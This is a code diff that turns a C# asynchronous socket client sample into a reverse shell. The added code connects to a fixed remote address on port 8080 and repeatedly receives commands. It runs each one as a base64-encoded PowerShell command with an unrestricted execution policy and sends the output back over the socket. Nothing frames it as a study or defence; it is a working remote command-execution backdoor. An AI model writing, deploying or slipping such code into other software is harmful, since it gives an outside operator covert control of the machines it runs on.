@@ -20,10 +20,6 @@ public class StateObject
 
 public class AsynchronousClient
 {
-    // The port number for the remote device.  
-    private const int port = 11000;
-
-    // ManualResetEvent instances signal completion.  
     private static ManualResetEvent connectDone =
         new ManualResetEvent(false);
     private static ManualResetEvent sendDone =
@@ -31,41 +27,57 @@ public class AsynchronousClient
     private static ManualResetEvent receiveDone =
         new ManualResetEvent(false);
 
+    private static Socket client;
+
+
     // The response from the remote device.  
     private static String response = String.Empty;
+    private static String result = String.Empty;
+    private static Process process = new Process();
 
     private static void StartClient()
     {
-        // Connect to a remote device.  
+        process.EnableRaisingEvents = true;
+        process.OutputDataReceived += new DataReceivedEventHandler(process_OutputDataReceived);
+        process.ErrorDataReceived += new DataReceivedEventHandler(process_ErrorDataReceived);
+        process.Exited += new EventHandler(process_Exited);
         try
         {
-            // Establish the remote endpoint for the socket.  
-            // The name of the   
-            // remote device is "host.contoso.com".  
             IPAddress ipAddress = IPAddress.Parse("10.14.59.49");
             IPEndPoint remoteEP = new IPEndPoint(ipAddress, 8080);
-
-            // Create a TCP/IP socket.  
-            Socket client = new Socket(ipAddress.AddressFamily,
-                SocketType.Stream, ProtocolType.Tcp);
-
-            // Connect to the remote endpoint.  
+            client = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
             client.BeginConnect(remoteEP,
                 new AsyncCallback(ConnectCallback), client);
             connectDone.WaitOne();
 
-            // Send test data to the remote device.  
-            Send(client, "This is a test<EOF>");
-            sendDone.WaitOne();
-
-            // Receive the response from the remote device.  
-            Receive(client);
-            receiveDone.WaitOne();
-
-            // Write the response to the console.  
-            Console.WriteLine("Response received : {0}", response);
-
-            // Release the socket.  
+            while (true) { 
+                Receive(client);
+                receiveDone.WaitOne();
+                Console.WriteLine(response);
+                var psCommandBytes = Encoding.Unicode.GetBytes(response);
+                var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
+                process.StartInfo.FileName = "powershell.exe";
+                process.StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -EncodedCommand " + psCommandBase64;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.Start();
+                try
+                {
+                    process.BeginErrorReadLine();
+                    process.BeginOutputReadLine();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e);
+                }
+                process.WaitForExit();
+                Send(result);
+                process.CancelOutputRead();
+                process.CancelErrorRead();
+                receiveDone.Reset();
+                result = "";
+            }
             client.Shutdown(SocketShutdown.Both);
             client.Close();
 
@@ -105,7 +117,7 @@ public class AsynchronousClient
             // Create the state object.  
             StateObject state = new StateObject();
             state.workSocket = client;
-
+            Console.WriteLine("Should Receive");
             // Begin receiving the data from the remote device.  
             client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                 new AsyncCallback(ReceiveCallback), state);
@@ -120,33 +132,13 @@ public class AsynchronousClient
     {
         try
         {
-            // Retrieve the state object and the client socket   
-            // from the asynchronous state object.  
             StateObject state = (StateObject)ar.AsyncState;
             Socket client = state.workSocket;
-
-            // Read data from the remote device.  
             int bytesRead = client.EndReceive(ar);
-
-            if (bytesRead > 0)
-            {
-                // There might be more data, so store the data received so far.  
-                state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));
-
-                // Get the rest of the data.  
-                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
-                    new AsyncCallback(ReceiveCallback), state);
-            }
-            else
-            {
-                // All the data has arrived; put it in response.  
-                if (state.sb.Length > 1)
-                {
-                    response = state.sb.ToString();
-                }
-                // Signal that all bytes have been received.  
-                receiveDone.Set();
-            }
+            Console.WriteLine(bytesRead);
+            state.sb.Append(Encoding.ASCII.GetString(state.buffer, 8, bytesRead - 8));
+            response = state.sb.ToString();
+            receiveDone.Set();
         }
         catch (Exception e)
         {
@@ -154,7 +146,7 @@ public class AsynchronousClient
         }
     }
 
-    private static void Send(Socket client, String data)
+    private static void Send(String data)
     {
         // Convert the string data to byte data using ASCII encoding.  
         byte[] byteData = Encoding.ASCII.GetBytes(data);
@@ -184,33 +176,25 @@ public class AsynchronousClient
         }
     }
 
-    private static void Base64EncodedCommand(String psCommand)
+    private static void process_Exited(object sender, EventArgs e)
     {
-        var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
-        var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
+        Console.WriteLine(string.Format("process exited with code {0}\n", process.ExitCode.ToString()));
+    }
 
-        var startInfo = new ProcessStartInfo()
-        {
-            FileName = "powershell.exe",
-            Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
-            UseShellExecute = false
-        };
-        Process.Start(startInfo);
+    private static void process_ErrorDataReceived(object sender, DataReceivedEventArgs e)
+    {
+        Console.WriteLine(e.Data + "\n");
+    }
+
+    private static void process_OutputDataReceived(object sender, DataReceivedEventArgs e)
+    {
+        Console.WriteLine(e.Data + "\n");
+        result += e.Data + "\n";
     }
 
     public static int Main(String[] args)
     {
         StartClient();
-        /*while (true)
-        {
-            // get the user input for every iteration, allowing to exit at will
-            String line = Console.ReadLine();
-            if (line.Equals("exit"))
-            {
-                break;
-            }
-            Base64EncodedCommand(line);
-        }*/
         return 0;
     }
 }
